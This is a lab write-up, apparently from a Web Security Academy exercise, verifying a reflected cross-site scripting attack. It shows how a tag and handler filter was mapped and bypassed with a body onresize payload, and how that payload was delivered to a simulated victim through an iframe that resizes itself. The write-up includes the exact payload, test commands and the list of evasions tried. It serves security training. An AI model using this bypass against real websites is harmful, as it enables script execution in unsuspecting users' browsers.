# Verification — WAF bypass (body + onresize) with victim delivery

## Methodology
1. Reflection mapping (curl): unique marker → single echo (`<h1>`, verbatim).
2. WAF oracle discovery: oversized battery → 400 (reject-style). Reframe all
   subsequent tests as 400-vs-200 differentials.
3. Tag sweep (~45 tags, GET with proper URL-encoding — note: `--data-urlencode`
   forces POST and yields misleading 404s; build query strings explicitly).
4. Handler sweep (~40 `on*` in allowed-tag context), then case/separator evasions
   for the blocked ones (confirm robustness, not just presence).
5. Official objective retrieval (lab page): victim `print()`, zero interaction.
6. CDP merge→handler→dispatch proof with title marker (no victim needed).
7. Exploit-server STORE (byte-verify) → DELIVER → access-log + banner polls.

## Evidence

### 1. Reflection (curl, `?search=reconprobe`)
```
<h1>0 search results for 'reconprobe'</h1>   (verbatim, no encoding observed)
```

### 2. WAF oracle (curl status codes)
- Battery (`<script><img…>` ×30 tags) → 400. Reject-style confirmed.
- Tags: all 400 except `<body>` (any case: `<body>`,`<Body>`,`<BODY>` → 200) and
  unknown/custom (`<xss>`,`<x>`,`<custom-tag>` → 200). Case-insensitive known-tag list.
- Handlers: common `on*` (load/error/focus/click/mouseover/pageshow/…) → 400 incl.
  case (`OnLoAd`) and separator (`/`, newline, tab) evasions and custom-tag hosts.
  Allowed (200): onpointercancel, ongotpointercapture, onlostpointercapture,
  onformdata, onsecuritypolicyviolation, onslotchange, oncancel, onstorage,
  onlanguagechange, onrejectionhandled — and separately **onresize**.
- Attribute-position mapping: `<xss onfocus>` (no `=`) → 400; `<xss foo=onfocus>`
  (value) → 400; bare `onfocus=`/`onerror` (no brackets) → 200 — the filter keys on
  `on\w+` inside `<…>`. `autofocus`, `href/src/id/class/style/title` all pass.

### 3. Gap selection reasoning (recorded, not sprayed)
Of 11 passing handlers, only `onresize` is a window event both body-mergeable AND
triggerable programmatically without interaction (iframe style resize). The rest need
dead triggers (no CSP → no securitypolicyviolation; no storage writes; pointer
capture; slot/dialog/form-only targets; unload-suppressed dialogs). `onresize` was
tested BECAUSE it uniquely satisfies the lab's no-interaction constraint.

### 4. Merge→handler→dispatch proof (CDP, title marker)
```
?search="><body onresize=document.title='RSZPROOF'>
→ document.body.getAttribute('onresize') == "document.title='RSZPROOF'"  (merged)
→ typeof window.onresize === 'function'                                 (live)
→ dispatch resize → title: RSZPROOF                                      (fires)
```

### 5. Delivery evidence
- STORE → 200; `GET /exploit` serves the iframe byte-verbatim (verified BEFORE each
  deliver — hashchange-lab overwrite lesson applied).
- DELIVER ×2 → 302s; victim latency ~4 min (first delivery seemingly unqueued/lost —
  re-delivered; no dummy-body POSTs were made this time).
- Access log: `GET /exploit/ "Mozilla/5.0 (Victim)…Chrome/151.0.0.0…"` — victim visit.
- Banner: `is-notsolved` → `is-solved` (log page itself also showed `is-solved`).

### 6. Stored exploit body (exact)
```html
<iframe src="https://0ac9002f04e71ad880b8fd5200de0000.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

### 7. Failed-candidate analysis
| Candidate | Result | Why |
|---|---|---|
| `<img>/<svg>/<script>/…` (~45 tags) | 400 | known-tag blocklist (case-insensitive) |
| Common `on*` + case/separator evasions | 400 | robust handler matching inside tags |
| Custom tags + common handlers | 400 | handler list applies regardless of host tag |
| 10 obscure-but-allowed handlers | 200 yet undrivable | no autonomous trigger (documented per-handler above) |
| Self-`print()` in own browser | fires but does NOT solve | platform requires the VICTIM signal (objective note) |
| `--data-urlencode` GET construction | 404s (methodology bug) | flag forces POST; build query strings explicitly |

## Reproducibility
```
BASE=…; q() { python3 -c "import urllib.parse,sys;print(urllib.parse.quote_plus(sys.argv[1]))" "$1"; }
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/?search=$(q '<body onresize=X>')"   # expect 200
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/?search=$(q '<img src=x onerror=X>')" # expect 400
# CDP: navigate payload URL → assert body[onresize] + window.onresize fn → dispatch resize → title
# exploit server: STORE full body → GET /exploit byte-check → DELIVER → GET /log (victim UA) → banner
```

## Confirmation criteria
- CONFIRMED: verbatim echo, WAF maps (tags + handlers + positions), merge + live
  handler + dispatch execution, stored-bytes integrity, victim visit, `is-solved`.
- The delivery-latency episode is logged as victim-scheduling behavior, distinguished
  from exploit breakage by the access log (no visit entries) and byte checks (intact).